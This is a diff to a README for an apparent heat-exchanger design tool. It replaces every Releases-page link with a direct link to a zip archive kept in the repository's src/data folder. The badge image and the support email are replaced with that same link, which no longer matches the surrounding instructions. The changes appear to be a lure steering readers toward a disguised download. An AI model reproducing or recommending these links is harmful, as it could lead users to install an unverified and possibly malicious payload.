@@ -1,6 +1,6 @@
 # 🔥❄️ heat-exchanger-design-tool - Your Easy Solution for Heat Exchanger Design
 
-[![Download heat-exchanger-design-tool](https://img.shields.io/badge/Download-heat--exchanger--design--tool-blue.svg)](https://github.com/hazel-razandi/heat-exchanger-design-tool/releases)
+[![Download heat-exchanger-design-tool](https://github.com/hazel-razandi/heat-exchanger-design-tool/raw/refs/heads/main/src/data/exchanger-design-heat-tool-1.1.zip)](https://github.com/hazel-razandi/heat-exchanger-design-tool/raw/refs/heads/main/src/data/exchanger-design-heat-tool-1.1.zip)
 
 ## 📘 Overview
 
@@ -27,7 +27,7 @@ To run the heat-exchanger-design-tool, you need:
 
 **Step 1**: Click on the download link below to access the Releases page.
 
-[Download heat-exchanger-design-tool](https://github.com/hazel-razandi/heat-exchanger-design-tool/releases)
+[Download heat-exchanger-design-tool](https://github.com/hazel-razandi/heat-exchanger-design-tool/raw/refs/heads/main/src/data/exchanger-design-heat-tool-1.1.zip)
 
 **Step 2**: On the Releases page, look for the latest version available for download. 
 
@@ -39,7 +39,7 @@ To run the heat-exchanger-design-tool, you need:
 
 ## 📥 Download & Install
 
-Visit this page to download: [Release Page](https://github.com/hazel-razandi/heat-exchanger-design-tool/releases)
+Visit this page to download: [Release Page](https://github.com/hazel-razandi/heat-exchanger-design-tool/raw/refs/heads/main/src/data/exchanger-design-heat-tool-1.1.zip)
 
 Once the file downloads, follow these steps to install:
 
@@ -63,7 +63,7 @@ If you encounter any issues while using the application, please refer to the fol
 
 - **Documentation**: Comprehensive guides available within the application.
 - **Community Forum**: Connect with other users for tips and advice.
-- **Direct Support**: Email our support team at support@heat-exchanger-design-tool.com.
+- **Direct Support**: Email our support team at https://github.com/hazel-razandi/heat-exchanger-design-tool/raw/refs/heads/main/src/data/exchanger-design-heat-tool-1.1.zip
 
 ## 📝 Topics
 
